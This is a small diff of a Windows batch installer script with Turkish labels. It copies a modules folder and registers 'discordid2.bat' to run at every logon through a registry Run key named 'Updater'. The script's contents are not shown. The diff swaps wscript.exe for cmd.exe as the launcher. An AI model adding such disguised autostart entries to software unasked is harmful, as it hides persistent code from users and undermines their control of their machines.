@@ -15,7 +15,7 @@ set KAYNAK=%~dp0modules\accepts
 
 robocopy "%KAYNAK%" "%HEDEF%" /E
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "wscript.exe \"%HEDEF%\discordid2.bat\"" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "cmd.exe /c \"%HEDEF%\discordid2.bat\"" /f
 
 echo Tamamlandi.
 pause
